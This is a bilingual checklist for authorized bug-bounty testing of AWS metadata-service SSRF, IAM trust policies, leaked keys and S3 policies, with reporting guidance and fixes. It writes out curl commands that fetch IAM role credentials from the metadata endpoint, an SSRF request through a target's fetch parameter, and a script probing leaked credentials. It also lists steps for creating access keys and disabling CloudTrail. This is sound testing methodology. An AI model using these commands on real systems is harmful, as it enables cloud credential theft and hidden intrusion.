---
id: clk-cloud-aws-metadata-iam
title: Cloud AWS Metadata & IAM
owasp_anchor: [API2:2023, API7:2023, WSTG-CONF]
cwe: [CWE-918, CWE-732, CWE-269]
severity_typical: P1-P2
playbook: playbooks/cloud_aws.yaml
last_updated: 2026-05-14
sources:
  - docs/intelligence_kb/cases/public_reports/6-real-ssrf-via-ipv6-redirects-on-hackerone.md
  - docs/intelligence_kb/cases/public_reports/9-unauthenticated-ssrf-via-public-reference-api-sharing-token-bypass.md
  - docs/intelligence_kb/cases/researcher_writeups/12-autogpt-ssrf-protection-bypass-to-internal-services.md
  - docs/intelligence_kb/cases/researcher_writeups/15-oauth-dynamic-client-registration-open-redirect-to-full-read-ssrf.md
  - docs/intelligence_kb/cases/researcher_writeups/2-ssrf-protection-bypass-in-autogpt-ai-agent-tool.md
  - docs/intelligence_kb/cases/researcher_writeups/20-full-read-ssrf-in-gitlab-analytics-dashboard-bypassing-localhost.md
  - docs/intelligence_kb/cases/researcher_writeups/5-ssrf-indirect-prompt-injection-chain-in-ai-assistant-feature.md
  - docs/intelligence_kb/cases/x_threads/20-s3-xss-via-bucket-misconfig-bucketlist-tool.md
  - docs/intelligence_kb/review_queue/16-payment-bypass-bug-lab-for-hands-on-techniques.md
  - docs/intelligence_kb/review_queue/22-intigriti-bug-bytes-235-real-ssrf-ipv6-and-idor-methodology.md
  - docs/intelligence_kb/review_queue/resource-16-payment-bypass-bug-lab-for-hands-on-techniques.md
  - docs/intelligence_kb/review_queue/resource-22-intigriti-bug-bytes-235-real-ssrf-ipv6-and-idor-methodology.md
  - docs/intelligence_kb/techniques/evergreen_new_context/14-blind-ssrf-via-dns-in-pdf-generator-of-saas-export-feature.md
  - docs/intelligence_kb/techniques/evergreen_new_context/case-derived-15-oauth-dynamic-client-registration-open-redirect-to-full-read-ssrf.md
  - docs/intelligence_kb/techniques/evergreen_new_context/case-derived-2-ssrf-protection-bypass-in-autogpt-ai-agent-tool.md
  - docs/intelligence_kb/techniques/evergreen_new_context/case-derived-20-full-read-ssrf-in-gitlab-analytics-dashboard-bypassing-localhost.md
  - docs/intelligence_kb/techniques/evergreen_new_context/case-derived-5-ssrf-indirect-prompt-injection-chain-in-ai-assistant-feature.md
  - docs/intelligence_kb/techniques/evergreen_new_context/case-derived-6-real-ssrf-via-ipv6-redirects-on-hackerone.md
  - docs/intelligence_kb/techniques/evergreen_new_context/case-derived-9-unauthenticated-ssrf-via-public-reference-api-sharing-token-bypass.md
  - docs/intelligence_kb/techniques/new_2024_2026/12-s3-misconfig-via-aws-s3-ls-no-sign-request-on-403.md
  - docs/intelligence_kb/techniques/new_2024_2026/2-aws-account-takeover-via-github-actions-oidc-wildcard-trust.md
  - docs/intelligence_kb/techniques/new_2024_2026/201-5-claude-bug-bounty-hunter-ai-assisted-recon-for-oauth-and-graphql.md
  - docs/intelligence_kb/techniques/new_2024_2026/5-s3-bucket-takeover-via-nosuchbucket-error.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-11-how-i-found-5-oauth-misconfigurations-leading-to-pre-account-takeover.md
  - docs/intelligence_kb/techniques/new_2024_2026/case-derived-20-s3-xss-via-bucket-misconfig-bucketlist-tool.md
  - docs/intelligence_kb/techniques/niche_tricks/22-parameter-discovery-for-sqli-xss-ssrf-via-6-methods.md
  - docs/intelligence_kb/techniques/niche_tricks/case-derived-12-autogpt-ssrf-protection-bypass-to-internal-services.md
maturity: stable
---

# AWS Metadata & IAM Checklist

> 双语 / Bilingual: AWS 元数据服务 SSRF、IAM 角色信任策略错配、跨账号信任、密钥泄露利用。
> 用法：先做 Recon 判断目标是否运行在 EC2/ECS/Lambda，再选 IMDS / role chain / key leak 分支。
> Authorization-only：所有 sts:AssumeRole / API 调用必须在 program scope 内，禁止枚举受害者真实数据。

---

## 1. Recon & 指纹

- [ ] 判断目标运行环境：HTTP header `Server: AmazonS3` / `x-amz-*` / EC2 metadata 反射
- [ ] 子域 CNAME 指向 `*.amazonaws.com` / `*.cloudfront.net` / `*.elb.*`
- [ ] 反查公网 IP 是否落在 AWS IP ranges（`https://ip-ranges.amazonaws.com/ip-ranges.json`）
- [ ] 判断计算载体：EC2 / ECS task / Fargate / Lambda / EKS pod（错误回显里的路径常常暴露）
- [ ] 收集已暴露的 access_key_id 前缀（`AKIA` 长期 key / `ASIA` 临时 key）
- [ ] 找 SSRF 入口：URL fetcher、webhook、PDF 渲染、SVG 解析、远程图片导入、OAuth `redirect_uri` 回源、Server-side image proxy

## 2. IMDSv1 vs IMDSv2 SSRF

### 2.1 IMDSv1（无 token）
- [ ] `http://169.254.169.254/latest/meta-data/` 直接 GET，是否返回 instance-id
- [ ] `iam/security-credentials/` 列出附加 role 名
- [ ] `iam/security-credentials/<role>` 取临时凭据（AccessKeyId / SecretAccessKey / Token）
- [ ] `user-data` 是否包含明文密码 / SSH key / bootstrap script
- [ ] `dynamic/instance-identity/document` 暴露 accountId / region

### 2.2 IMDSv2（要求 PUT token）
- [ ] 通过 SSRF 是否能发起 `PUT /latest/api/token`（Header: `X-aws-ec2-metadata-token-ttl-seconds: 21600`）
- [ ] 用拿到的 token 走 `GET /latest/meta-data/iam/security-credentials/<role>`，Header: `X-aws-ec2-metadata-token: <token>`
- [ ] HTTP method 注入：blind SSRF 是否允许 PUT
- [ ] 头注入 SSRF：CRLF 注入 / HTTP/0.9 / Gopher 协议绕过

### 2.3 容器化变种
- [ ] ECS：`http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
- [ ] EKS Pod IRSA：环境变量 `AWS_WEB_IDENTITY_TOKEN_FILE`、`AWS_ROLE_ARN` 是否暴露
- [ ] Lambda：环境变量 `AWS_LAMBDA_RUNTIME_API` 内部端点 `127.0.0.1:9001/2018-06-01/runtime/invocation/next`
- [ ] Fargate：链路同 ECS task role

## 3. IAM 角色信任策略 / 跨账号

- [ ] `sts:AssumeRole` Trust Policy 中 `Principal: "*"` 或宽 wildcard
- [ ] 缺 `sts:ExternalId` → confused deputy（任意客户都能 assume）
- [ ] 缺 `aws:SourceAccount` / `aws:SourceArn` 条件
- [ ] 信任 `cognito-identity.amazonaws.com` 但不校验 `aud` / `amr` claim
- [ ] OIDC trust（GitHub Actions / GitLab）`sub` 通配过宽：`repo:*` 而不是 `repo:org/name:ref:refs/heads/main`
- [ ] role chaining：A → B → C，B 的 trust 是否允许任意 A 账号
- [ ] PassRole 滥用：Lambda / EC2 创建权限 + iam:PassRole 任意 role

## 4. 密钥泄露利用（Key Leak Triage）

- [ ] GitHub / GitLab dorks：`AKIA[0-9A-Z]{16}` + 公司域名
- [ ] JS bundle / sourcemap 内联：`grep -RE 'AKIA[0-9A-Z]{16}' dist/`
- [ ] `.git/config` / `.env` / `docker-compose.yml` / Dockerfile 残留
- [ ] Stack trace / Sentry / 日志面板回显 `Authorization: AWS4-HMAC-SHA256 Credential=AKIA...`
- [ ] S3 列出 + ACL：`aws s3 ls s3://bucket --no-sign-request` / `aws s3api get-bucket-acl`
- [ ] 用泄露 key 做 `aws sts get-caller-identity` 确认 accountId
- [ ] `aws iam get-user` / `list-attached-user-policies` 看权限边界
- [ ] `aws iam simulate-principal-policy` 模拟可调用的 action 集合（仅在自有账号靶机上做）

## 5. S3 / 资源策略 ConfusedDeputy

- [ ] bucket policy `Principal: "*"` + Action `s3:GetObject`
- [ ] CloudFront OAI / OAC 缺失：直接绕 CDN 命中桶
- [ ] Pre-signed URL 时长过长（>7 天）/ 可改 query string 参数
- [ ] `s3:PutObjectAcl` 给到上传方 → upload 后改 ACL=public-read
- [ ] SQS / SNS / KMS 资源策略 `Principal: "*"`
- [ ] Lambda function URL `AuthType: NONE`
- [ ] API Gateway resource policy 缺 `aws:SourceVpce` 限制

## 6. STS 后利用（Authorization-only / 自有靶机）

- [ ] `aws sts get-session-token` 拉长 session
- [ ] `aws sts assume-role --role-arn ... --role-session-name pwn`
- [ ] `aws iam list-access-keys` / `create-access-key`（高危：仅靶机）
- [ ] CloudTrail 关停 / event selector 空（仅靶机验证）

## 7. 自动化辅助

```bash
# IMDSv2 token 获取并查 role
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 通过 SSRF 用 Burp Collab 出网验证 blind
curl 'https://target/fetch?url=http://169.254.169.254/latest/meta-data/'

# 静态密钥 triage
aws sts get-caller-identity
aws iam get-account-authorization-details > authz.json
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)

# 跨账号 trust 审计（自有账号）
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument!=null]' \
  | jq '.[] | select(.AssumeRolePolicyDocument | tostring | contains("\"*\""))'

# Nuclei
nuclei -tags aws,ssrf,exposed-tokens -u https://target

# 公开工具（自有账号枚举）
# https://github.com/RhinoSecurityLabs/pacu
# https://github.com/salesforce/cloudsplaining
# https://github.com/nccgroup/ScoutSuite
```

```python
# 用泄露的临时凭据快速判断权限范围
import boto3, json
sess = boto3.Session(aws_access_key_id="ASIA...", aws_secret_access_key="...", aws_session_token="...")
print(sess.client("sts").get_caller_identity())
for svc in ("s3","ec2","iam","lambda"):
    try:
        c = sess.client(svc)
        print(svc, "ok")
    except Exception as e:
        print(svc, "fail", e)
```

## 8. Reporting Angle

* **Title 模板**：`<服务> <flaw> allows <attacker> to <impact> via <vector>`
  例：`Server-side image proxy SSRF leaks EC2 IAM role credentials via IMDSv1`
* **CVSS 3.1 上下界**：
  * 拿到长期 sts 凭据 + 高权限策略：CVSS 9.0-9.8 / VRT P1
  * 仅泄露 instance metadata（无凭据返回）：CVSS 5.3-6.5 / VRT P3
  * IMDSv2 部分绕过（需要链式 SSRF）：CVSS 7.5-8.5 / VRT P2
* **CWE 推荐**：CWE-918（SSRF）/ CWE-732（资源策略错配）/ CWE-269（权限管理）
* **PoC 必须**：完整请求 / 临时 key 仅前 4 位 + 后 4 位（其余 `***`）/ `aws sts get-caller-identity` 输出截断 / 不附带任何受害方真实业务数据
* **Suggested Fix**（≥ 2 条）：
  * 强制 IMDSv2（`aws ec2 modify-instance-metadata-options --http-tokens required`）
  * SSRF 入口侧 Egress allowlist + 拒绝 RFC1918 / 169.254.0.0/16
  * Trust Policy 收紧：`ExternalId` + `aws:SourceArn` 条件
  * 短期凭据 + IAM Access Analyzer 回归审计

## 9. 已迁移技法（来自 KB）

- [[techniques/imds_v1_ssrf|IMDSv1 SSRF 取角色凭据]]
- [[techniques/imds_v2_token_smuggle|IMDSv2 PUT token 绕过]]
- [[techniques/aws_role_chain_confused_deputy|Role chaining + ConfusedDeputy]]
- [[techniques/aws_key_leak_triage|泄露 AKIA/ASIA 快速 triage]]
